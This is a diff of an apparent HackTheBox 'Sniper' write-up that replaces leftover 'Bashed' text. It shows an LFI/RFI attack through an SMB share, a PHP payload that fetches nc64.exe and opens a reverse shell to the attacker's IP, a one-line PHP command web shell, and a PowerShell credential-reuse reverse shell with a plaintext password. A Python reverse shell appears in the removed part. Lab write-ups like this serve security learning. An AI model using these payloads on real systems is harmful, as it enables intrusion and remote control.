@@ -1,7 +1,7 @@
 ---
 title: "Sniper"
 date: 2023-06-24T23:52:47+02:00
-tags: ["privesc","web","windows","smb"]
+tags: ["web","windows","smb","LFI"]
 categories: ["hackthebox"]
 author: "0x0Pwn"
 image: /HTB/Sniper.png
@@ -9,7 +9,7 @@ showToc: true
 TocOpen: false
 draft: false
 hidemeta: false
-comments: false
+comments: true
 description: ""
 canonicalURL: "https://canonical.url/to/page"
 disableHLJS: true # to disable highlightjs
@@ -49,7 +49,9 @@ editPost:
 - nmap
 - gobuster
 - whatweb
-- 
+- smbserver.py
+- nc
+- python3 -m http.server
 
 ## Port Scanning
 
@@ -75,6 +77,10 @@ Soon I realized this error that had the page:
 
 ![Untitled](/HTB/php-error-sniper.png)
 
+I started trying common Windows files to test if it is a Local File Inclusion (LFI) vulnerability. 
+However, this wouldn’t get me far since I can only view files and not execute any commands or view 
+directories structure and contents. At most, I could try to brute-force in a search for other files.
+I need to find a way to achieve code execution on the machine.
 
 Here I leave the commands I used to test the error until I realized that I was indeed facing a vulnerability:
 
@@ -88,12 +94,12 @@ that we do not interpret the PHP code
 Now instead of try to introduce a local element of the machine, I'm going to try to introduce a extern element of my
 fisical sistem:
 	
- - The first attempt was to open a web server with *python3 -m http.server 80* and then modify the url of the machine 
-   like this *http://10.10.10.151/blog/?lang=http://10.10.14.5/nmap*, to try to point to my address and see 
+ - The first attempt was to open a web server with `python3 -m http.server 80` and then modify the url of the machine 
+   like this `http://10.10.10.151/blog/?lang=http://10.10.14.5/nmap`, to try to point to my address and see 
    if I received any requests. Nothing well.
 	
- - The second attempt was to create a server with SMB  with *smbserver.py smbFolder $(pwd) -smb2support* to share the 
-   smbfolder folder and modify the url as follows *http://10.10.10.151/blog/?lang=//10.10.14.5/smbFolder/test*. 
+ - The second attempt was to create a server with SMB  with `smbserver.py smbFolder $(pwd) -smb2support` to share the 
+   smbfolder folder and modify the url as follows `http://10.10.10.151/blog/?lang=//10.10.14.5/smbFolder/test`. 
    We have connection !!!
    
    ![Untitled](/HTB/smbserver-sniper.png) 
@@ -101,95 +107,98 @@ fisical sistem:
    what should happen is that we would have to see the NTLM hash of version 2, but in this case it does not come out, 
    so maybe we are having a problem with the service we are offering, and we are also supporting version 2 of smb. 
 
- - The third attempt was
+ - The third attempt was to use the same command on our system `smbserver.py smbFolder $(pwd) -smb2support`, but in
+   this case I put this files {escaneo, nc64.exe, exploit.php } inside the directory we were sharing via smb with the victim machine.
+   
+   I personaly create a php code that which downloads the payload.php to a temporary directory that we create on 
+   the victim machine, and then executes it. Before modifying the url of the web page so that it 
+   points `http://10.10.10.151/blog/?lang=\10.10.14.9.9\smbFolder\payload.php` to our shared smb server, we have 
+   to raise the server on port 8000 in our kali with `python3 -m http.server` and listen on port 4444 to receive
+   the reverse shell with `nc -nlvp 443`, and ready!
+
+   The content of payload.php is:
+	
+	```php
+	<?php
+        function uploadFile($file){
+                $url = "http://10.10.14.9:8000/" . $file;
+                $file_name = "C:\\temp\\" . $file;
+                if(file_put_contents($file_name, file_get_contents($url))){
+                        echo "File download successfully";
+                } else{
+                        print($file_name);
+                        echo "File downloading failed";
+                }
+        }
+
+        function makeTempDir(){
+                system("mkdir C:\\temp");
+        }
 
 
-If we visit the website there are only one article with a web reverse shell information called phpbash, and a url to the github project.
+        function reverseShell($shell){
+                system("C:\\temp\\nc64.exe 10.10.14.9 4444 -e " . $shell);
+        }
 
-In the url we can find some useful information like how works, this shell removes the necessity of do a traditional reverse shell.
+        $file = "nc64.exe";
+        $shell = "powershell";
 
-Let’s try this but first some fuzzing
+        makeTempDir();
+        uploadFile("nc64.exe");
+        reverseShell($shell);
 
-![Untitled](/HTB/bashed-6.png)
+	?>
 
-We can see that there is a uploads directory maybe we can try to upload a reverse shell.
+	```
 
-With nikto, I found that the /dev directory maybe its useful
+   This is more or less the set:
 
-![Untitled](/HTB/bashed-7.png)
+   ![Untitled](/HTB/previo-sniper.png)
 
-Inside the directory, there are two files, the two of them are the reverse shell which we have seen in the previous github project (seems like a reverse shell to his own machine). If we try to run one we get in.
+   Then, the machine pawned jejeje
+	
+   ![Untitled](/HTB/reverseShell-sniper.png)
 
-## Gaining an Initial Foothold
 
-![Untitled](/HTB/bashed-8.png)
 
-We are logged like the web service and the user flag is in the arrexel home directory.
+ - Other posible way is instead using payload.php is using this php code:
+	
+	```php
+	<?php
+		system($_REQUEST['cmd'])
+	?>
+	```
+	
+   Which allows us to use the url as if it were cmd:
 
-![Untitled](/HTB/bashed-9.png)
+   ![Untitled](/HTB/otraForma-sniper.png)
 
-Now let’s elevate privilege
 
-If we go to the / directory we can see that inside there is a script folder created by scriptmanager user.
+## Escalation of privileges
 
-When we try sudo -l we found that the the www-data user has acces to scriptmanager as sudo.
+The first I do is `whoami` to kwnow what user I'm using. Then I search for any interesting document
+like a *.db where I found a password `36mEAhz...`  and a user called Sniper.
 
-Let’s try `sudo -u scriptmanager -e /bin/bash` 
+![Untitled](/HTB/psw-sniper.png)
 
-![Untitled](/HTB/bashed-10.png)
+Then I use this command -> `net users` to know how many users there are in the Sniper machine and his names.
 
-Don’t seem to work, maybe the web server doesn’t allow some commands.
-
-Now let’s try to upload the reverse shell and this time trying to connect it to our machine instead of using the shell on /dev.
-
-One way is to create a http server and curl the file in the victim machine. We need to modify the reverse shell file that I get [here](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) with our ip and port.
-
-![Untitled](/HTB/bashed-11.png)
-
-![Untitled](/HTB/bashed-12.png)
-
-Now let’s open a listening port with netcat and run the shell.
-
-![Untitled](/HTB/bashed-13.png)
-
-![Untitled](/HTB/bashed-14.png)
-
-Before nothing, we are going to pass from a dumb shell to a fully interactive one.
-
-First once we spawn a bash with `python -c 'import pty; pty.spawn("/bin/bash")'` then lets keep the nc in background with ctrl^z, once done we use `stty raw -echo` and then `fg` to return to the web shell but fully interactive this time.
-
-Let’s retry `sudo -u scriptmanager /bin/bash`
-
-![Untitled](/HTB/bashed-15.png)
-
-We are scriptmanager now, let’s see what we can do in the /scripts folder. It’s seems like there are two files in the folder. One of them [test.py](http://test.py) look like this:
+After thatI realized that we can use powershell and declare some variables like credentials, password,
+and user, to use a Invoke-Command on user Sniper/chris and send a revershe sell to our kali.
 
 ```bash
-f = open("test.txt", "w")
-f.write("testing 123!")
-f.close
+$user = "Sniper\chris"
+$password = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($user, $password)
+Invoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { \\10.10.14.9\smbFolder\nc64.exe 10.10.14.9 443 -e cmd }
 ```
+In me Kali I'm listenning the 443 port using -> `nc -nlvp 443`
 
-This file is created by scriptmanager but the execution of the file needs be owned by root somehow because inside the execution we are opening the test.txt file that only can be modified with root permissions. If you observe the creation time of the file test.txt, you will notice that it undergoes changes every minute. This pattern strongly suggests the presence of a cron job, which is owned by the root user, and is responsible for executing the test.py script every minute.
 
-We can use this to our advantage and change the content of the [test.py](http://test.py) file to a reverse shell and get the system own.
+Before that we have the user **chris**, and the Flag !!!
 
-```python
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.14.17",1234)) //change this
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-```
 
-I get this reverse shell from [pentestmonkey’s](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) handy dandy list of reverse shells.
-
-Let’s set up a listener in the port 1234 and let the magic happen.
-
-![Untitled](/HTB/bashed-17.png)
-
-## Lessons Learned
+## Leason Learned
 
 - What insights did you gain from the room?
     
